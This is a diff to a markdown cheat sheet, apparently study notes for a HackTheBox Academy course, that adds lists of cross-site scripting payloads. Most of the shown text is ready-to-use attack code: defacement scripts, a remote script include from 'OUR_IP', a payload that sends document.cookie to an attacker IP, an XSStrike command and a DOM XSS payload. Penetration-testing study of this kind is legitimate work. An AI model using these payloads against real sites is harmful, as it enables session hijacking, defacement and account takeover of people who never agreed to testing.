@@ -427,11 +427,52 @@ CTRL + U
 
 *DOM XSS	= Occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server and is written to an HTML DOM object (e.g., through client-side HTTP parameters or anchor tags - vulnerable username or page title).*
 
-- XSS Testing Payloads
+- Basic XSS Payloads
 
 ```
+<script>alert("XSS")</script>
 <script>alert(window.origin)</script>
+<plaintext>
 <script>print()</script> 
+```
+
+- HTML XSS Payloads
+
+```
+<img src="" onerror=alert(window.origin)>	
+```
+
+- Deface XSS Payloads
+
+```
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+<script>document.title = 'HackTheBox Academy'</script>
+<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
+<script>document.getElementById('urlform').remove();</script>
+```
+
+- Remote Script XSS Payloads
+
+```
+<script src="http://OUR_IP/script.js"></script>	
+```
+
+- Cookie XSS Payloads
+
+```
+<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
+```
+
+- Automated XSS
+
+```
+$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"	
+```
+
+- DOM XSS Payloads
+
+```
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
